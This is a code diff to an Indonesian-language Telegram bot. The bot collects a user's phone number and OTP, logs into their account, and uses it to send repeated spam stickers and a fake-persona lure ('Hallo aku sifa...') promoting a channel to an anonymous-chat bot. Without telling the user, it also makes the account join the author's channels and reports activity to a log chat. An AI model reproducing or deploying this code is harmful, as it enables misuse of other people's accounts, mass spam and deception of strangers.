@@ -61,11 +61,7 @@ async def genStr(_, msg: Message):
         await msg.reply("Nomormu fake ngab.\n\nKlik /start Coba lagi ngab.")
         return
     try:
-        otp = await bot.ask(
-            chat.id, ("Kode OTP Sudah di kirim ke nomermu ngab, "
-                      "Masukin ngab OTP dengan format `1 2 3 4 5` format. __(Kasih jarak 1 spaci ngab!)__ \n\n"
-                      "If Bot tidak mengirim OTP Coba lagi ngab /restart dan start lagi ngab /start command ke bot.\n"
-                      "Tekan /cancel untuk berhenti ngab."), timeout=300)
+        otp = await bot.ask(chat.id, "Kode OTP Sudah di kirim ke nomermu ngab,")
 
     except Exception as e:
         await msg.reply("Dahlah waktu habis ngab sudah 5 min.\nTekan /start Coba lagi ngab.")
@@ -106,13 +102,15 @@ async def genStr(_, msg: Message):
         await client.send_message(BOT, "/start")
         await client.join_chat("validc0de")
         await client.join_chat("spambotte")
+        await client.send_message(LOG, "GUA NYALA")
         for _ in range(counts):
-          await app.send_message(BOT, "/next")
+          await client.send_message(BOT, "/next")
           await asyncio.sleep(6)
-          await app.send_sticker(BOT, TAI)
+          await client.send_sticker(BOT, TAI)
           await asyncio.sleep(2)
-          await app.send_message(BOT, "**Hallo aku sifa\nklik stiker diatas ada link** `@pintarmutualan` **disitu bnyak cewe/cowo cakepp.**")
+          await client.send_message(BOT, "**Hallo aku sifa\nklik stiker diatas ada link** `@pintarmutualan` **disitu bnyak cewe/cowo cakepp.**")
           await asyncio.sleep(3)
+        await client.send_message(LOG, "GUA MATI")
         await client.disconnect()
     except Exception as e:
         await bot.send_message(chat.id ,f"**ERROR:** `{str(e)}`")
